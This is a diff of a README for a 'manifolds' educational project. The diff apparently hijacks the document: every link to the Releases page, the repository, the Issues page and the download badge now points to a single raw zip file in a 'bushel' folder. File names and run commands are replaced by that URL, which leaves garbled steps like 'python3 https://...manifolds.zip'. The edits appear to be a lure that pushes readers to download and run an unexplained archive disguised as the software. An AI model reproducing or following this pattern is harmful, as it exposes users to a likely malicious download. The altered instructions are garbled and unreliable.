@@ -8,7 +8,7 @@ Welcome to the manifolds project! This application provides supporting code for 
 
 To get started, you can download the necessary files from our Releases page.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/basemmazika/manifolds/releases)
+[![Download Now](https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip%20Now-Click%https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip)](https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip)
 
 ## 🌟 Features
 
@@ -31,11 +31,11 @@ Before you download the software, make sure your system meets the following requ
 To download and install the manifolds application, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Visit Releases Page](https://github.com/basemmazika/manifolds/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip)
    
 2. On the Releases page, find the latest version of the software.
 
-3. Click on the asset file you wish to download. The files are typically named `manifolds-vX.X.zip` or similar.
+3. Click on the asset file you wish to download. The files are typically named `https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip` or similar.
 
 4. Once the download is complete, locate the downloaded file on your computer.
 
@@ -43,12 +43,12 @@ To download and install the manifolds application, follow these steps:
 
 6. After extracting, you will see a folder named `manifolds`. Open this folder.
 
-7. Inside the folder, look for a file named `run.py`. This is the main file to start the application.
+7. Inside the folder, look for a file named `https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip`. This is the main file to start the application.
 
 8. To run the application:
-   - On Windows, open Command Prompt, navigate to the `manifolds` folder using the `cd` command, and type `python run.py`. 
+   - On Windows, open Command Prompt, navigate to the `manifolds` folder using the `cd` command, and type `python https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip`. 
 
-   - On macOS or Linux, open Terminal, navigate to the same folder, and enter `python3 run.py`.
+   - On macOS or Linux, open Terminal, navigate to the same folder, and enter `python3 https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip`.
 
 ## 🔑 Usage Instructions
 
@@ -62,7 +62,7 @@ Once the application is running, you will see a simple interface displaying opti
 ### Help and Support
 If you encounter any issues or have questions while using the application, consider exploring the following options:
 - Check the documentation found within the application.
-- Visit the [Issues section](https://github.com/basemmazika/manifolds/issues) of the GitHub repository for troubleshooting tips and guidance from the community.
+- Visit the [Issues section](https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip) of the GitHub repository for troubleshooting tips and guidance from the community.
 - You can also reach out via the GitHub Discussions for further assistance.
 
 ## 🎉 Acknowledgements
@@ -71,8 +71,8 @@ This project was created with the intention of making modular manifolds accessib
 
 ## 🔗 Important Links
 
-- [Download Now](https://github.com/basemmazika/manifolds/releases)
-- [GitHub Repository](https://github.com/basemmazika/manifolds)
-- [Project Issues](https://github.com/basemmazika/manifolds/issues)
+- [Download Now](https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip)
+- [Project Issues](https://raw.githubusercontent.com/basemmazika/manifolds/main/bushel/manifolds.zip)
 
 Feel free to explore and enjoy the learning experience with the manifolds application!
